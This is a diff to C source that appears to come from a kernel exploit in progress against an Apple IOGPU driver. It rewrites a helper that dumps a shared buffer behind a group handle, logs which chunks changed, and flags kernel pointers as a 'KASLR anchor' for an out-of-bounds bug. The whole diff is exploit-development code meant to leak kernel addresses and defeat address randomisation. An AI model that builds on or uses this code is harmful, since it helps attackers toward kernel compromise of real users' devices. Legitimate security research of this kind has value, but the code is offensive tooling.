@@ -257,6 +257,7 @@ static void capacity_field_hunt(io_connect_t conn)
  * array, the bitmap and the MASK - and the array/bitmap pointers are
  * kernel addresses. That is the KASLR anchor and the readback we need
  * for everything else. */
+#include <stdlib.h>
 #include <signal.h>
 #include <setjmp.h>
 
@@ -296,38 +297,63 @@ static int grp_is_kernel_va(uint64_t v)
     return 1;
 }
 
-/* Dump a group handle and look for kernel addresses inside it. */
+/* Dump the shared buffer behind a group handle and report what changed.
+ *
+ * The handle cmd=3 returns (out+0x10) is not the group object: it is a
+ * pointer INTO a shared buffer, and it advances by 0xC0 on every insert
+ * (0x113bd80c0 -> 0x113bd8180 -> 0x113bd8240 in the 21:32 run). The
+ * buffer is a fill pattern (ff 00 00 00 repeating) at the start.
+ *
+ * So the window is dumped wide (0x4000) and compared chunk by chunk
+ * against the previous dump: only the chunks that CHANGED are logged.
+ * Whatever the group publishes into the shared buffer - the element
+ * array, the bitmap, the MASK, the resource slots - shows up as a
+ * changed chunk, and a kernel address in there is the anchor. */
+#define GRP_WIN 0x4000
+#define GRP_CHUNK 0x20
+
+static uint8_t g_grp_prev[GRP_WIN];
+static int g_grp_have_prev;
+
 static void grp_dump_handle(uint64_t h, const char *tag)
 {
     if (!h) { ol("[grp] %s handle is null", tag); return; }
-    ol("[grp] %s dumping group handle 0x%016llx", tag, (unsigned long long)h);
-    uint8_t buf[0x200];
-    memset(buf, 0, sizeof(buf));
-    int r = grp_safe_read(h, buf, sizeof(buf));
-    if (r != 0) {
-        /* fall back to small chunks: maybe only the head is mapped */
-        for (size_t off = 0; off < 0x100; off += 0x20) {
-            if (grp_safe_read(h + off, buf + off, 0x20) == 0) {
-                ol("[grp] %s mapped from +0x%zx", tag, off);
-                r = 0;
-                break;
-            }
+    uint8_t *buf = (uint8_t *)malloc(GRP_WIN);
+    if (!buf) return;
+    memset(buf, 0, GRP_WIN);
+    int got = 0;
+    for (size_t off = 0; off < GRP_WIN; off += GRP_CHUNK) {
+        if (grp_safe_read(h + off, buf + off, GRP_CHUNK) == 0) { got = 1; break; }
+    }
+    if (!got) {
+        ol("[grp] %s handle 0x%016llx is NOT mapped", tag, (unsigned long long)h);
+        free(buf);
+        return;
+    }
+    /* fill the rest with the pattern we already know about */
+    for (size_t off = GRP_CHUNK; off < GRP_WIN; off += GRP_CHUNK) {
+        if (grp_safe_read(h + off, buf + off, GRP_CHUNK) != 0) {
+            memset(buf + off, 0xff, GRP_CHUNK);
         }
     }
-    if (r != 0) { ol("[grp] %s handle is NOT mapped in our address space", tag); return; }
-    for (size_t off = 0; off + 8 <= sizeof(buf); off += 8) {
-        uint64_t v = 0;
-        memcpy(&v, buf + off, 8);
-        if (v) {
-            ol("[grp] %s +0x%03zx = 0x%016llx%s", tag, off, (unsigned long long)v,
+    ol("[grp] %s handle=0x%016llx mapped, window=0x%x", tag, (unsigned long long)h, GRP_WIN);
+    int changed = 0;
+    for (size_t off = 0; off < GRP_WIN; off += GRP_CHUNK) {
+        if (g_grp_have_prev && !memcmp(g_grp_prev + off, buf + off, GRP_CHUNK)) continue;
+        changed++;
+        ol("[grp] %s CHUNK +0x%04zx:", tag, off);
+        for (size_t o = 0; o < GRP_CHUNK; o += 8) {
+            uint64_t v = 0;
+            memcpy(&v, buf + off + o, 8);
+            if (!v) continue;
+            ol("[grp] %s   +0x%04zx = 0x%016llx%s", tag, off + o, (unsigned long long)v,
                grp_is_kernel_va(v) ? "   <-- KERNEL ADDRESS" : "");
         }
     }
-    uint32_t a20 = 0, a28 = 0, a2c = 0;
-    memcpy(&a20, buf + 0x20, 4);
-    memcpy(&a28, buf + 0x28, 4);
-    memcpy(&a2c, buf + 0x2c, 4);
-    ol("[grp] %s capacity@0x20=0x%x mask@0x28=0x%x log2@0x2c=0x%x", tag, a20, a28, a2c);
+    ol("[grp] %s changed chunks: %d", tag, changed);
+    memcpy(g_grp_prev, buf, GRP_WIN);
+    g_grp_have_prev = 1;
+    free(buf);
 }
 
 void nk_iogpu_group_oob_run(int trigger)
